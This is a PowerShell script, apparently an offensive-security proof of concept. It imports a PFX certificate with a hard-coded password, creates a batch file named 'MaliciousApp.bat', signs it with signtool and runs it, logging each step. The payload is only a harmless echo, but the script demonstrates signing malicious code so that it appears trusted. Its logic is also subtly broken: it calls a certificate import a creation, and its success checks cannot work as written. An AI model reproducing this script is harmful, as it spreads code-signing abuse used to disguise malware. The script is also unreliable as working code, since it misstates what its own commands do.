$logFile = "script_log.txt"

function LogMessage($message) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $message = "[$timestamp] $message"
    $message | Out-File -Append -FilePath $logFile
    Write-Host $message
}

$password = "letmein"
$certFile = "SelfSignedCert.pfx"
$maliciousFile = "MaliciousApp.bat"

$signtoolPath = "C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x86\signtool.exe"

$workingDirectory = "C:\Users\antho\Documents\GitHub\POC-CVE-for-offensive-security\POC\"
Set-Location $workingDirectory

LogMessage("Script execution started.")

LogMessage("Creating self-signed certificate with certutil.exe...")
Start-Process -Wait -FilePath "certutil.exe" -ArgumentList "-v -p `"$password`" -importPFX $certFile"

if (Test-Path $certFile) {
    LogMessage("Self-signed certificate created successfully.")
} else {
    LogMessage("Failed to create the self-signed certificate. Check for errors.")
}

LogMessage("Creating the malicious executable...")
Set-Content -Path $maliciousFile -Value "echo This is a malicious application!"
Add-Content -Path $maliciousFile -Value "pause"

$signtoolArgs = "sign /f $certFile /p `"$password`" /tr http://timestamp.digicert.com /td SHA256 $maliciousFile"
LogMessage("Signing the malicious executable with signtool.exe...")
Start-Process -Wait -FilePath $signtoolPath -ArgumentList $signtoolArgs

if ($LASTEXITCODE -eq 0) {
    LogMessage("Malicious executable signed successfully.")
} else {
    LogMessage("Failed to sign the malicious executable. Check for errors.")
}

LogMessage("Running the malicious executable...")
Start-Process -FilePath $maliciousFile

LogMessage("Script execution completed.")

Invoke-Item $logFile
